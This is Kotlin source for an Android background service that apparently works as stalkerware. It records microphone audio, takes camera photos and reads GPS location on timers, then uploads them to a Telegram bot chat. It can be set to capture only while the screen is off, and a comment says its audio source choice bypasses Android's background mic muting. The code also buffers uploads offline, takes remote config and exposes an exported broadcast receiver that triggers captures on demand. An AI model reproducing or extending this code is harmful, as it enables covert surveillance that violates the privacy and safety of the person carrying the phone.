package com.example.telegramsender

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.content.pm.PackageManager
import android.location.LocationManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.content.pm.ServiceInfo
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import com.example.telegramsender.utils.OfflineQueueManager

class MonitorService : Service(), LifecycleOwner {

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
        
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var job: Job? = null
    
    // Credentials & Config
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendAudio: Boolean = false
    private var audioDuration: Long = 60000L
    private var audioScreenOff: Boolean = false
    private var sendCamera: Boolean = false
    private var cameraScreenOff: Boolean = false
    private var cameraFacing: String = "front"
    private var captureInterval: Long = 10000L 
    private var sendLocation: Boolean = false
    private var locationInterval: Long = 600000L // 10 mins

    private val mediaMutex = Mutex()
    private var commandReceiver: android.content.BroadcastReceiver? = null
    private var mediaRecorder: android.media.MediaRecorder? = null
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    private val prefsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { sharedPreferences, key ->
        updateConfigFromPrefs(sharedPreferences)
    }

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
        
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        pref.registerOnSharedPreferenceChangeListener(prefsListener)
        updateConfigFromPrefs(pref)
        
        startForegroundServiceNotification()
        registerCommandReceiver()
        com.example.telegramsender.utils.LocationHelper.startListening(this)
        registerNetworkCallback()
        
        startLoops()
    }
    
    private fun updateConfigFromPrefs(pref: android.content.SharedPreferences) {
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
        cameraFacing = pref.getString("cameraFacing", "front") ?: "front"
        sendAudio = pref.getBoolean("sendAudio", false)
        sendLocation = pref.getBoolean("sendLocation", false)
        
        val camSec = pref.getLong("cameraInterval", 10L) 
        captureInterval = camSec * 1000L
        if (captureInterval < 5000L) captureInterval = 5000L
        
        audioDuration = pref.getLong("audioDuration", 60L) * 1000L
        if (audioDuration < 5000L) audioDuration = 5000L
        audioScreenOff = pref.getBoolean("audioScreenOff", false)
        cameraScreenOff = pref.getBoolean("cameraScreenOff", false)

        val locMin = pref.getLong("locationInterval", 10L)
        locationInterval = locMin * 60 * 1000L
        if (locationInterval < 60000L) locationInterval = 60000L

        startForegroundServiceNotification()
    }

    private fun registerCommandReceiver() {
        val filter = IntentFilter().apply {
            addAction("com.example.telegramsender.ACTION_TEST_AUDIO")
            addAction("com.example.telegramsender.ACTION_FORCE_LOCATION")
            addAction("com.example.telegramsender.ACTION_FORCE_CAMERA")
        }
        commandReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    "com.example.telegramsender.ACTION_TEST_AUDIO" -> {
                        Log.d("MonitorService", "ACTION_TEST_AUDIO received: triggering 10s audio test")
                        CoroutineScope(Dispatchers.IO).launch {
                            mediaMutex.withLock {
                                recordAndSendAudio(durationMs = 10000L)
                            }
                        }
                    }
                    "com.example.telegramsender.ACTION_FORCE_LOCATION" -> {
                        Log.d("MonitorService", "ACTION_FORCE_LOCATION received")
                        CoroutineScope(Dispatchers.IO).launch {
                            fetchAndSendLocation()
                        }
                    }
                    "com.example.telegramsender.ACTION_FORCE_CAMERA" -> {
                        Log.d("MonitorService", "ACTION_FORCE_CAMERA received")
                        CoroutineScope(Dispatchers.IO).launch {
                            mediaMutex.withLock {
                                captureCameraAndSend()
                            }
                        }
                    }
                }
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    private fun unregisterCommandReceiver() {
        try {
            commandReceiver?.let { unregisterReceiver(it) }
            commandReceiver = null
        } catch (e: Exception) {
            Log.e("MonitorService", "Failed to unregister command receiver", e)
        }
    }
    
    // Cleanup
    override fun onDestroy() {
        super.onDestroy()
        unregisterCommandReceiver()
        unregisterNetworkCallback()
        com.example.telegramsender.utils.LocationHelper.stopListening()
        job?.cancel()
        mediaRecorder?.release()
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        getSharedPreferences("tg_pref", MODE_PRIVATE).unregisterOnSharedPreferenceChangeListener(prefsListener)
    }

    private fun registerNetworkCallback() {
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    Log.d("MonitorService", "Network gained: automatically flushing 20MB offline queue & syncing...")
                    CoroutineScope(Dispatchers.IO).launch {
                        val flushed = OfflineQueueManager.flushQueue(this@MonitorService, client)
                        if (flushed > 0) {
                            Log.d("MonitorService", "Flushed $flushed items from offline queue on network reconnect")
                        }
                        performCloudSync()
                    }
                }
            }
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            networkCallback?.let { connectivityManager?.registerNetworkCallback(request, it) }
        } catch (e: Exception) {
            Log.e("MonitorService", "Failed to register network callback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) }
        } catch (e: Exception) {
            Log.e("MonitorService", "Failed to unregister network callback", e)
        }
    }

    // ... (rest of onStartCommand) ...
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
        startForegroundServiceNotification()
        // No loadCredentials here, handled by onCreate and listener
        if (job == null || job?.isActive == false) startLoops()
        return START_STICKY
    }
    
    // Remove loadCredentials method entirely or alias it
    
    private fun startLoops() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            // Heartbeat
            launch {
                while (isActive) {
                    startForegroundServiceNotification()
                    delay(60000)
                }
            }

            // Fast REST Cloud Sync Loop (Minimum 5s, configurable from dashboard)
            launch {
                while (isActive) {
                    val sec = com.example.telegramsender.data.DevicePreferences.getSyncIntervalSeconds(this@MonitorService)
                    val delayMs = Math.max(5L, sec) * 1000L

                    if (com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        performCloudSync()
                    }

                    delay(delayMs)
                }
            }

            // Audio Loop
            launch {
                while (isActive) {
                    val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                    if (!pref.getBoolean("is_monitoring_active", false)) {
                        delay(5000)
                        continue
                    }
                    if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000) // Check again in 1 min
                        continue
                    }
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                         val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                         if (shouldRecord) {
                             mediaMutex.withLock {
                                 recordAndSendAudio()
                             }
                             // Cooldown between audio recordings to let HAL release
                             delay(10000L)
                         } else {
                             delay(5000L)
                         }
                    } else {
                        delay(10000L) // Longer idle wait
                    }
                }
            }
            
            // Camera Loop
            launch {
                 while (isActive) {
                     val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                     if (!pref.getBoolean("is_monitoring_active", false)) {
                         delay(5000)
                         continue
                     }
                     if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000) // Check again in 1 min
                        continue
                     }
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                         val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
                         if (shouldCapture) {
                             mediaMutex.withLock {
                                 captureCameraAndSend()
                             }
                         }
                     }
                     
                     // Adaptive delay: if not configured, wait longer
                     val waitTime = if (sendCamera) captureInterval else 10000L
                     delay(waitTime)
                 }
            }

            // Location Loop
            launch {
                while (isActive) {
                    val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                    if (!pref.getBoolean("is_monitoring_active", false)) {
                        delay(5000)
                        continue
                    }
                    if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000)
                        continue
                    }
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendLocation) {
                        fetchAndSendLocation()
                    }
                    delay(locationInterval)
                }
            }
        }
    }

    private fun fetchAndSendLocation() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        try {
            val providers = lm.getProviders(true)
            var bestLoc: android.location.Location? = null
            for (p in providers) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
                    bestLoc = l
                }
            }
            if (bestLoc != null) {
                sendTelegramLocation(botToken, targetChatId, bestLoc.latitude, bestLoc.longitude)
            }
        } catch (e: Exception) {
            Log.e("MonitorService", "Location error", e)
        }
    }

    private fun sendTelegramLocation(token: String, chatId: String, lat: Double, lon: Double) {
        val url = "https://api.telegram.org/bot$token/sendLocation"
        val body = okhttp3.FormBody.Builder()
            .add("chat_id", chatId)
            .add("latitude", lat.toString())
            .add("longitude", lon.toString())
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try { client.newCall(request).execute().use {
             if (it.isSuccessful) {
                 val key = if (url.contains("sendLocation")) "last_location_sent" else "last_photo_sent"
                 getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong(key, System.currentTimeMillis()).apply()
             }
        } } catch (e: Exception) {}
    }

    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = okhttp3.FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try { client.newCall(request).execute().use {
             if (it.isSuccessful) {
                 val key = if (url.contains("sendLocation")) "last_location_sent" else "last_photo_sent"
                 getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong(key, System.currentTimeMillis()).apply()
             }
        } } catch (e: Exception) {}
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isInteractive
    }

    private data class AudioFormatPreset(
        val outputFormat: Int,
        val audioEncoder: Int,
        val sampleRate: Int,
        val bitRate: Int,
        val extension: String,
        val mimeType: String,
        val name: String
    )

    private suspend fun recordAndSendAudio(durationMs: Long = audioDuration) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e("MonitorService", "Permission RECORD_AUDIO denied")
            return
        }

        // Check for active call or communication
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
        if (audioManager != null && (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
            audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION)) {
            Log.w("MonitorService", "Microphone busy (Call/Comm). Skipping recording.")
            delay(15000)
            return
        }
        
        // Cooldown/stabilization pause before acquiring mic
        delay(1000)

        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
        val timestamp = dateFormat.format(java.util.Date())
        
        var mr: android.media.MediaRecorder? = null
        var recordStarted = false
        var stopSuccess = false
        var activePreset: AudioFormatPreset? = null
        var audioFile: java.io.File? = null

        val formatPresets = listOf(
            AudioFormatPreset(
                outputFormat = android.media.MediaRecorder.OutputFormat.AMR_WB,
                audioEncoder = android.media.MediaRecorder.AudioEncoder.AMR_WB,
                sampleRate = 16000,
                bitRate = 23850,
                extension = "amr",
                mimeType = "audio/amr",
                name = "AMR-WB (16kHz Wideband HD Voice)"
            ),
            AudioFormatPreset(
                outputFormat = android.media.MediaRecorder.OutputFormat.THREE_GPP,
                audioEncoder = android.media.MediaRecorder.AudioEncoder.AMR_NB,
                sampleRate = 8000,
                bitRate = 12200,
                extension = "amr",
                mimeType = "audio/amr",
                name = "AMR-NB (8kHz Universal Speech)"
            ),
            AudioFormatPreset(
                outputFormat = android.media.MediaRecorder.OutputFormat.MPEG_4,
                audioEncoder = android.media.MediaRecorder.AudioEncoder.AAC,
                sampleRate = 44100,
                bitRate = 64000,
                extension = "m4a",
                mimeType = "audio/m4a",
                name = "AAC (MPEG_4 44.1kHz)"
            )
        )

        // Sources to attempt in priority order:
        // 1. VOICE_RECOGNITION: Bypasses Android 13/HyperOS background mic muting & audio ducking
        // 2. MIC: Standard hardware mic
        // 3. DEFAULT: System default
        val candidateSources = intArrayOf(
            android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
            android.media.MediaRecorder.AudioSource.MIC,
            android.media.MediaRecorder.AudioSource.DEFAULT
        )

        outer@ for (preset in formatPresets) {
            for (source in candidateSources) {
                val tempFile = java.io.File(cacheDir, "audio_${timestamp}.${preset.extension}")
                var recorder: android.media.MediaRecorder? = null
                try {
                    recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        android.media.MediaRecorder(this)
                    } else {
                        @Suppress("DEPRECATION")
                        android.media.MediaRecorder()
                    }

                    recorder.apply {
                        setAudioSource(source)
                        setOutputFormat(preset.outputFormat)
                        setAudioEncoder(preset.audioEncoder)
                        setAudioChannels(1)
                        if (preset.sampleRate > 0) setAudioSamplingRate(preset.sampleRate)
                        if (preset.bitRate > 0) setAudioEncodingBitRate(preset.bitRate)
                        setOutputFile(tempFile.absolutePath)
                        prepare()
                        start()
                    }
                    mr = recorder
                    activePreset = preset
                    audioFile = tempFile
                    recordStarted = true
                    Log.d("MonitorService", "MediaRecorder started successfully using [${preset.name}] with source=$source for ${durationMs}ms")
                    break@outer
                } catch (e: Exception) {
                    Log.w("MonitorService", "Preset [${preset.name}] with source=$source failed: ${e.message}")
                    try { recorder?.reset() } catch (_: Exception) {}
                    try { recorder?.release() } catch (_: Exception) {}
                    if (tempFile.exists()) tempFile.delete()
                }
            }
        }

        if (!recordStarted || mr == null || audioFile == null) {
            Log.e("MonitorService", "All AudioSource/Preset attempts failed to initialize MediaRecorder")
            return
        }

        try {
            // Record for requested duration
            delay(durationMs)

            try {
                mr.stop()
                stopSuccess = true
            } catch (e: RuntimeException) {
                Log.w("MonitorService", "MediaRecorder.stop() failed (insufficient frames or aborted): ${e.message}")
                stopSuccess = false
            }
        } catch (e: CancellationException) {
            Log.w("MonitorService", "Recording coroutine cancelled")
            try { mr.stop() } catch (_: Exception) {}
            throw e
        } catch (e: Exception) {
            Log.e("MonitorService", "Error during audio recording duration", e)
        } finally {
            try { mr.release() } catch (_: Exception) {}
            mr = null
        }

        // Validate resulting audio file:
        // Must exist, stop must have succeeded, and size must be > 1024L
        if (stopSuccess && audioFile.exists() && audioFile.length() > 1024L) {
            Log.d("MonitorService", "Audio file recorded successfully: ${audioFile.name} (${audioFile.length()} bytes)")
            val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
            val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
            val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""

            if (!OfflineQueueManager.isNetworkAvailable(this@MonitorService)) {
                Log.d("MonitorService", "Device offline: saving audio recording to 20MB offline buffer")
                OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
            } else {
                val sent = sendTelegramAudio(tok, cid, audioFile, activePreset?.mimeType ?: "audio/amr")
                if (!sent) {
                    Log.w("MonitorService", "Audio upload failed, buffering to 20MB offline queue")
                    OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
                }
            }
        } else {
            Log.w("MonitorService", "Audio recording invalid or too small (${audioFile?.length()} bytes, stopSuccess=$stopSuccess). Discarding.")
        }

        // Always clean up temp cache file (it was copied if enqueued)
        if (audioFile != null && audioFile.exists()) {
            audioFile.delete()
        }
    }
    
    private suspend fun captureCameraAndSend() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e("MonitorService", "Cannot capture photo: CAMERA permission is not granted")
            return
        }

        withTimeoutOrNull(15000L) {
            val captureDeferred = CompletableDeferred<Unit>()
            withContext(Dispatchers.Main) {
                if (lifecycleRegistry.currentState != Lifecycle.State.RESUMED) {
                    lifecycleRegistry.currentState = Lifecycle.State.RESUMED
                }

                try {
                    val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
                    cameraProviderFuture.addListener({
                        try {
                            val cameraProvider = cameraProviderFuture.get()
                            val imageCapture = ImageCapture.Builder()
                                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                                .build()

                            val isBack = cameraFacing.equals("back", ignoreCase = true)
                            val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
                            val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
                                targetSelector
                            } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
                                CameraSelector.DEFAULT_FRONT_CAMERA
                            } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
                                CameraSelector.DEFAULT_BACK_CAMERA
                            } else {
                                targetSelector
                            }

                            cameraProvider.unbindAll()
                            cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
                            Log.d("MonitorService", "Camera bound to lifecycle ($cameraSelector), taking picture...")

                            imageCapture.takePicture(
                                ContextCompat.getMainExecutor(this@MonitorService),
                                object : ImageCapture.OnImageCapturedCallback() {
                                    override fun onCaptureSuccess(image: ImageProxy) {
                                        Log.d("MonitorService", "Camera onCaptureSuccess: received image frame")
                                        val bitmap = imageProxyToBitmap(image)
                                        image.close()
                                        cameraProvider.unbindAll()

                                        if (bitmap != null) {
                                            CoroutineScope(Dispatchers.IO).launch {
                                                val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                                                val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
                                                val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""
                                                sendTelegramPhoto(tok, cid, bitmap, "camera.jpg")
                                            }
                                        } else {
                                            Log.e("MonitorService", "Failed to decode bitmap from camera ImageProxy")
                                        }
                                        captureDeferred.complete(Unit)
                                    }

                                    override fun onError(exception: ImageCaptureException) {
                                        Log.e("MonitorService", "Camera takePicture failed: code=${exception.imageCaptureError}", exception)
                                        cameraProvider.unbindAll()
                                        captureDeferred.complete(Unit)
                                    }
                                }
                            )
                        } catch (e: Exception) {
                            Log.e("MonitorService", "Camera binding or execution exception", e)
                            captureDeferred.complete(Unit)
                        }
                    }, ContextCompat.getMainExecutor(this@MonitorService))
                } catch (e: Exception) {
                    Log.e("MonitorService", "Camera setup exception", e)
                    captureDeferred.complete(Unit)
                }
            }
            captureDeferred.await()
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }

    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File, mimeType: String = "audio/amr"): Boolean {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
        val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
        if (tok.isEmpty() || cid.isEmpty()) {
            Log.e("MonitorService", "Cannot send audio: token or chatId is empty")
            return false
        }

        // 1. First attempt: Telegram /sendVoice (designed specifically for voice notes .amr / .ogg / .m4a)
        val voiceUrl = "https://api.telegram.org/bot$tok/sendVoice"
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", cid)
                .addFormDataPart("voice", file.name, file.asRequestBody(mimeType.toMediaTypeOrNull()))
                .build()
            val request = Request.Builder().url(voiceUrl).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d("MonitorService", "Voice note sent successfully via /sendVoice (${file.name}, ${file.length()} bytes)")
                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
                    return true
                } else {
                    val errBody = response.body?.string() ?: ""
                    Log.w("MonitorService", "sendVoice returned HTTP ${response.code}: $errBody. Falling back to sendAudio...")
                }
            }
        } catch (e: Exception) {
            Log.w("MonitorService", "sendVoice attempt failed: ${e.message}. Trying sendAudio...")
        }

        // 2. Second attempt: Telegram /sendAudio fallback
        val audioUrl = "https://api.telegram.org/bot$tok/sendAudio"
        return try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", cid)
                .addFormDataPart("audio", file.name, file.asRequestBody(mimeType.toMediaTypeOrNull()))
                .build()
            val request = Request.Builder().url(audioUrl).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d("MonitorService", "Audio file sent successfully via /sendAudio")
                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
                    true
                } else {
                    val errBody = response.body?.string() ?: ""
                    Log.e("MonitorService", "sendAudio failed HTTP ${response.code}: $errBody")
                    false
                }
            }
        } catch (e: Exception) { 
            Log.e("MonitorService", "Send Audio Failed", e)
            false
        }
    }
    
    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
        val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
        if (tok.isEmpty() || cid.isEmpty()) {
            Log.e("MonitorService", "Cannot send photo: Telegram token or chatId is empty!")
            return
        }
        val url = "https://api.telegram.org/bot$tok/sendPhoto"
        val stream = ByteArrayOutputStream()
        originalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
        val byteArray = stream.toByteArray()
        originalBitmap.recycle()

        // 1. If offline, buffer directly into 20MB local queue
        if (!OfflineQueueManager.isNetworkAvailable(this)) {
            Log.d("MonitorService", "Device offline: saving camera snapshot to 20MB buffer. Queue: ${OfflineQueueManager.getQueueSummary(this)}")
            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
            return
        }

        // 2. If online and items exist in offline queue, flush
        if (OfflineQueueManager.getQueueItemCount(this) > 0) {
            CoroutineScope(Dispatchers.IO).launch {
                OfflineQueueManager.flushQueue(this@MonitorService, client)
            }
        }
        
        Log.d("MonitorService", "Sending ${byteArray.size} bytes photo to Telegram chat $cid")
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", cid)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        try { 
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d("MonitorService", "Camera photo sent successfully to Telegram")
                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_photo_sent", System.currentTimeMillis()).apply()
                } else {
                    Log.e("MonitorService", "Telegram sendPhoto failed: ${response.code}")
                    if (response.code >= 500) {
                        OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
                    }
                }
            } 
        } catch(e: Exception) {
            Log.e("MonitorService", "Failed to send photo to Telegram, buffering in 20MB offline queue", e)
            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
        }
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("MonitorServiceChannel", "Monitor Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, "MonitorServiceChannel")
            .setContentTitle("Monitor Service")
            .setContentText("Monitoring Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
            
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var type = 0
                if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (sendCamera && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                if (sendLocation && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                if (type == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                
                if (type != 0) {
                    try {
                        startForeground(2, notification, type)
                    } catch (se: SecurityException) {
                        Log.e("MonitorService", "SecurityException starting FGS with sensitive types. Retrying with DATA_SYNC.", se)
                        startForeground(2, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    }
                } else {
                    startForeground(2, notification)
                }
            } else {
                startForeground(2, notification)
            }
        } catch (e: Exception) {
            Log.e("MonitorService", "Failed to start FGS", e)
        }
    }

    private suspend fun performCloudSync() {
        if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this)) return
        try {
            val result = com.example.telegramsender.utils.SyncHelper.performSync(this)
            if (result.success) {
                cameraFacing = result.config.cameraFacing
            }
            if (OfflineQueueManager.isNetworkAvailable(this) && OfflineQueueManager.getQueueItemCount(this) > 0) {
                OfflineQueueManager.flushQueue(this, client)
            }
        } catch (e: Exception) {
            Log.e("MonitorService", "Cloud sync loop error", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
